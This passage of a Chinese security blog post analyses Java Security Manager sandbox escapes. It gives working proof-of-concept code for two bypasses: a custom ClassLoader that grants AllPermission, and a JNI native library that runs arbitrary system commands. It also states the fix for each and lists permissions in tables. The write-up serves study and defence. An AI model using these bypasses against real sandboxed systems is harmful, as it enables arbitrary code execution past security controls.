class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.Channels;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.FileChannel;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.WritableByteChannel;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.security.cert.Certificate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyClassLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyClassLoader</span><span class="params">(ClassLoader parent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        File file = getClassFile(name);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = getClassBytes(file);</span><br><span class="line">            <span class="comment">//在这里调用defineClazz，而不是super.defineClass</span></span><br><span class="line">            Class&lt;?&gt; c = defineClazz(name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClazz(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len) <span class="keyword">throws</span> ClassFormatError &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PermissionCollection pc = <span class="keyword">new</span> Permissions();</span><br><span class="line">            pc.add(<span class="keyword">new</span> AllPermission());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置ProtectionDomain</span></span><br><span class="line">            ProtectionDomain pd = <span class="keyword">new</span> ProtectionDomain(<span class="keyword">new</span> CodeSource(<span class="keyword">null</span>, (Certificate[]) <span class="keyword">null</span>),</span><br><span class="line">                    pc, <span class="keyword">this</span>, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.defineClass(name, b, off, len, pd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> File <span class="title">getClassFile</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"./"</span> + name + <span class="string">".class"</span>);</span><br><span class="line">        <span class="keyword">return</span> file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] getClassBytes(File file) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        FileChannel fc = fis.getChannel();</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        WritableByteChannel wbc = Channels.newChannel(baos);</span><br><span class="line">        ByteBuffer by = ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> i = fc.read(by);</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span> || i == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            by.flip();</span><br><span class="line">            wbc.write(by);</span><br><span class="line">            by.clear();</span><br><span class="line">        &#125;</span><br><span class="line">        fis.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>BypassSandbox类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        MyClassLoader mcl = <span class="keyword">new</span> MyClassLoader();</span><br><span class="line">        Class&lt;?&gt; c1 = Class.forName(<span class="string">"Exploit"</span>, <span class="keyword">true</span>, mcl);</span><br><span class="line">        Object obj = c1.newInstance();</span><br><span class="line">        System.out.println(obj.getClass().getClassLoader());</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时尝试运行会发现报错：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy="E:\\my.policy" BypassSandbox</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/20.png" alt=""></p>
+<p>具体执行失败的原因可以参考threedr3am大佬的解释：<a href="https://github.com/codeplutos/java-security-manager-bypass/issues/2" target="_blank" rel="noopener">自定义ClassLoader绕过poc为什么很多人执行出现问题的缘由 #2</a></p>
+<p>一个简单的解决办法就是，在自定义的ClassLoader中重写loadClass()方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (name.contains(<span class="string">"Exploit"</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再试一下就OK了：</p>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/19.png" alt=""></p>
+<h4 id="修复方法-3"><a href="#修复方法-3" class="headerlink" title="修复方法"></a>修复方法</h4><p>禁止createClassLoader权限。</p>
+<h3 id="调用本地方法绕过"><a href="#调用本地方法绕过" class="headerlink" title="调用本地方法绕过"></a>调用本地方法绕过</h3><h4 id="Bypass利用-3"><a href="#Bypass利用-3" class="headerlink" title="Bypass利用"></a>Bypass利用</h4><p>Java Security Manager是在Java核心库中的一个功能，而Java中native方法是由JVM执行的，不受Java Security Manager管控。因此，我们可以调用Java native方法，绕过Java Security Manager。</p>
+<p>my.policy，允许loadLibrary以及根目录下任意文件读权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;loadLibrary.*&quot;;</span><br><span class="line">    permission java.io.FilePermission &quot;/root/-&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>EvilMethodClass类，声明一个native方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilMethodClass</span> </span>&#123;</span><br><span class="line">    <span class="comment">//加载动态链接库</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.load(<span class="string">"/root/libEvilMethodClass.so"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//声明一个native方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">evilMethod</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>生成.h头：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac src/com/evil/EvilMethodClass.java -d ./bin</span><br><span class="line">javah -jni -classpath ./bin -d ./jni com.evil.EvilMethodClass</span><br><span class="line">javah -jni -classpath ./bin -o EvilMethodClass.h com.evil.EvilMethodClass</span><br></pre></td></tr></table></figure>
+<p>新建EvilMethodClass.c：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"com_evil_EvilMethodClass.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL <span class="title">Java_com_evil_EvilMethodClass_evilMethod</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        JNIEnv *env, jclass cls, jstring j_str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *c_str = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    c_str = (*env)-&gt;GetStringUTFChars(env, j_str, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (c_str == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"out of memory.n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//在这里执行系统命令</span></span><br><span class="line">    system(c_str);</span><br><span class="line">    (*env)-&gt;ReleaseStringUTFChars(env, j_str, c_str);</span><br><span class="line">    <span class="keyword">return</span> (*env)-&gt;NewStringUTF(env, buff);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+<p>编译，生成动态链接库，然后放到/root/目录下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -I$JAVA_HOME/include -I$JAVA_HOME/include/linux -fPIC -shared EvilMethodClass.c -o libEvilMethodClass.so</span><br></pre></td></tr></table></figure>
+<p>Poc.java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        EvilMethodClass.evilMethod(<span class="string">"whoami"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里将Poc.java和EvilMethodClass.java一同打包成jar，然后在Kali中运行即可绕过Java Security Manager：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy=my.policy -jar exp.jar</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/21.png" alt=""></p>
+<h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><p>不授予loadLibrary权限。</p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.cnblogs.com/MyStringIsNotNull/p/8268351.html" target="_blank" rel="noopener">java中的安全模型(沙箱机制)</a></p>
+<p><a href="https://www.anquanke.com/post/id/151398" target="_blank" rel="noopener">java沙箱绕过</a></p>
+<p><a href="http://phrack.org/papers/escaping_the_java_sandbox.html" target="_blank" rel="noopener">Twenty years of Escaping the Java Sandbox</a></p>
+<p><a href="https://xz.aliyun.com/t/2840" target="_blank" rel="noopener">Java沙箱逃逸走过的二十个春秋（一）</a></p>
+<h2 id="0x05-附录"><a href="#0x05-附录" class="headerlink" title="0x05 附录"></a>0x05 附录</h2><h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><table>
+<thead>
+<tr>
+<th>权限名</th>
+<th>用途说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>accessClassInPackage.</td>
+<td>允许代码访问指定包中的类</td>
+</tr>
+<tr>
+<td>accessDeclaredMembers</td>
+<td>允许代码使用反射访问其他类中私有或保护的成员</td>
+</tr>
+<tr>
+<td>createClassLoader</td>
+<td>允许代码实例化类加载器</td>
+</tr>
+<tr>
+<td>createSecurityManager</td>
+<td>允许代码实例化安全管理器，它将允许程序化的实现对沙箱的控制</td>
+</tr>
+<tr>
+<td>defineClassInPackage.</td>
+<td>允许代码在指定包中定义类</td>
+</tr>
+<tr>
+<td>exitVM</td>
+<td>允许代码关闭整个虚拟机</td>
+</tr>
+<tr>
+<td>getClassLoader</td>
+<td>允许代码访问类加载器以获得某个特定的类</td>
+</tr>
+<tr>
+<td>getProtectionDomain</td>
+<td>允许代码访问保护域对象以获得某个特定类</td>
+</tr>
+<tr>
+<td>loadlibrary.</td>
+<td>允许代码装载指定类库</td>
+</tr>
+<tr>
+<td>modifyThread</td>
+<td>允许代码调整指定的线程参数</td>
+</tr>
+<tr>
+<td>modifyThreadGroup</td>
+<td>允许代码调整指定的线程组参数</td>
+</tr>
+<tr>
+<td>queuePrintJob</td>
+<td>允许代码初始化一个打印任务</td>
+</tr>
+<tr>
+<td>readFileDescriptor</td>
+<td>允许代码读文件描述符（相应的文件是由其他保护域中的代码打开的）</td>
+</tr>
+<tr>
+<td>setContextClassLoader</td>
+<td>允许代码为某线程设置上下文类加载器</td>
+</tr>
+<tr>
+<td>setFactory</td>
+<td>允许代码创建套接字工厂</td>
+</tr>
+<tr>
+<td>setIO</td>
+<td>允许代码重定向System.in、System.out或System.err输入输出流</td>
+</tr>
+<tr>
+<td>setSecurityManager</td>
+<td>允许代码设置安全管理器</td>
+</tr>
+<tr>
+<td>stopThread</td>
+<td>允许代码调用线程类的stop()方法</td>
+</tr>
+<tr>
+<td>writeFileDescriptor</td>
+<td>允许代码写文件描述符</td>
+</tr>
+</tbody>
+</table>
+<h3 id="B"><a href="#B" class="headerlink" title="B"></a>B</h3><table>
+<thead>
+<tr>
+<th>权限名</th>
+<th>用途说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>accessClipboard</td>
+<td>允许访问系统的全局剪贴板</td>
+</tr>
+<tr>
+<td>accessEventQueue</td>
+<td>允许直接访问事件队列</td>
+</tr>
+<tr>
+<td>createRobot</td>
+<td>允许代码创建AWT的Robot类</td>
+</tr>
+<tr>
+<td>listenToAllAWTEvents</td>
+<td>允许代码直接监听事件分发</td>
+</tr>
+<tr>
+<td>readDisplayPixels</td>
+<td>允许AWT Robot读显示屏上的像素</td>
+</tr>
+<tr>
+<td>showWindowWithoutWarningBanner</td>
+<td>允许创建无标题栏的窗口</td>
+</tr>
+</tbody>
+</table>
+<h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><table>
+<thead>
+<tr>
+<th>权限名</th>
+<th>用途说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>specifyStreamHandler</td>
+<td>允许在URL类中安装新的流处理器</td>
+</tr>
+<tr>
+<td>setDefaultAuthenticator</td>
+<td>可以安装鉴别类</td>
+</tr>
+<tr>
+<td>requestPassworkAuthentication</td>
+<td>可以完成鉴别</td>
+</tr>
+</tbody>
+</table>
+<h3 id="D"><a href="#D" class="headerlink" title="D"></a>D</h3><table>
+<thead>
+<tr>
+<th>权限名</th>
+<th>用途说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>addIdentityCertificate</td>
+<td>为Identity增加一个证书</td>
+</tr>
+<tr>
+<td>clearProviderProperties.</td>
+<td>针对指定的提供者，删除所有属性</td>
+</tr>
+<tr>
+<td>createAccessControlContext</td>
+<td>允许创建一个存取控制器的上下文环境</td>
+</tr>
+<tr>
+<td>getDomainCombiner</td>
+<td>允许撤销保护域</td>
+</tr>
+<tr>
+<td>getPolicy</td>
+<td>检索可以实现沙箱策略的类</td>
+</tr>
+<tr>
+<td>getProperty.</td>
+<td>读取指定的安全属性</td>
+</tr>
+<tr>
+<td>getSignerPrivateKey</td>
+<td>由Signer对象获取私有密钥</td>
+</tr>
+<tr>
+<td>insertProvider.</td>
+<td>将指定的提供者添加到响应的安全提供者组中</td>
+</tr>
+<tr>
+<td>loadProviderProperties.</td>
+<td>装载指定的提供者的属性</td>
+</tr>
+<tr>
+<td>printIdentity</td>
+<td>打印Identity类内容</td>
+</tr>
+<tr>
+<td>putAllProviderProperties.</td>
+<td>更新指定的提供者的属性</td>
+</tr>
+<tr>
+<td>putProviderProperty.</td>
+<td>为指定的提供者增加一个属性</td>
+</tr>
+<tr>
+<td>removeIdentityCertificate</td>
+<td>取消Identity对象的证书</td>
+</tr>
+<tr>
+<td>removeProvider.</td>
+<td>将指定的提供者从相应的安全提供者组中删除</td>
+</tr>
+<tr>
+<td>removeProviderProperty.</td>
+<td>删除指定的安全提供者的某个属性</td>
+</tr>
+<tr>
+<td>setIdentityInfo</td>
+<td>为某个Identity对象设置信息串</td>
+</tr>
+<tr>
+<td>setIdentityPublicKey</td>
+<td>为某个Identity对象设置公钥</td>
+</tr>
+<tr>
+<td>setPolicy</td>
+<td>设置可以实现沙箱策略的类</td>
+</tr>
+<tr>
+<td>setProperty.</td>
+<td>设置指定的安全属性</td>
+</tr>
+<tr>
+<td>setSignerKeyPair</td>
+<td>在Signer对象中设置密钥对</td>
+</tr>
+<tr>
+<td>setSystemScope</td>
+<td>设置系统所用的IdentityScope</td>
+</tr>
+</tbody>
+</table>
+<h3 id="E"><a href="#E" class="headerlink" title="E"></a>E</h3><table>
+<thead>
+<tr>
+<th>权限名</th>
+<th>用途说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>enableSubstitution</td>
+<td>允许实现ObjectInputStream类的enableResolveObject()方法和ObjectOutputStream类的enableReplaceObject()方法</td>
+</tr>
+<tr>
+<td>enableSubclassImplementation</td>
+<td>允许ObjectInputStream和ObjectOutputStream创建子类，子类可以覆盖readObject()和writeObject()方法</td>
+</tr>
+</tbody>
+</table>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Java沙箱"><span class="toc-text">0x01 Java沙箱</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Java沙箱简介"><span class="toc-text">Java沙箱简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java中的安全模型"><span class="toc-text">Java中的安全模型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java沙箱的基本组成"><span class="toc-text">Java沙箱的基本组成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java沙箱的要素"><span class="toc-text">Java沙箱的要素</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#权限"><span class="toc-text">权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#代码源"><span class="toc-text">代码源</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#保护域"><span class="toc-text">保护域</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#策略文件"><span class="toc-text">策略文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#java-policy"><span class="toc-text">java.policy</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#java-security"><span class="toc-text">java.security</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#密钥库"><span class="toc-text">密钥库</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#默认沙箱"><span class="toc-text">默认沙箱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java沙箱的应用"><span class="toc-text">Java沙箱的应用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#限制读文件"><span class="toc-text">限制读文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#限制访问网络"><span class="toc-text">限制访问网络</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Java-Security-Manager"><span class="toc-text">0x02 Java Security Manager</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SecurityManager类方法"><span class="toc-text">SecurityManager类方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#启动安全管理器"><span class="toc-text">启动安全管理器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#参数启动"><span class="toc-text">参数启动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#编码方式启动"><span class="toc-text">编码方式启动</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关闭安全管理器"><span class="toc-text">关闭安全管理器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Demo"><span class="toc-text">Demo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Java沙箱逃逸"><span class="toc-text">0x03 Java沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用单等号-home目录可写绕过"><span class="toc-text">利用单等号+home目录可写绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass利用"><span class="toc-text">Bypass利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#修复方法"><span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用setSecurityManager绕过"><span class="toc-text">利用setSecurityManager绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass利用-1"><span class="toc-text">Bypass利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#修复方法-1"><span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用反射绕过"><span class="toc-text">利用反射绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#调试分析"><span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass利用——getProtectionDomain0"><span class="toc-text">Bypass利用——getProtectionDomain0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass利用——ProcessImpl"><span class="toc-text">Bypass利用——ProcessImpl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#修复方法-2"><span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#创建ClassLoader绕过"><span class="toc-text">创建ClassLoader绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass利用-2"><span class="toc-text">Bypass利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#修复方法-3"><span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调用本地方法绕过"><span class="toc-text">调用本地方法绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass利用-3"><span class="toc-text">Bypass利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#修复方案"><span class="toc-text">修复方案</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-text">0x04 参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-附录"><span class="toc-text">0x05 附录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#A"><span class="toc-text">A</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#B"><span class="toc-text">B</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C"><span class="toc-text">C</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#D"><span class="toc-text">D</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#E"><span class="toc-text">E</span></a></li></ol></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2020/05/03/浅谈JVMTI/" rel="next" title="浅谈JVMTI">
+          浅谈JVMTI
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2020/05/08/浅析JVM/" rel="prev" title="浅析JVM">
+            浅析JVM
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
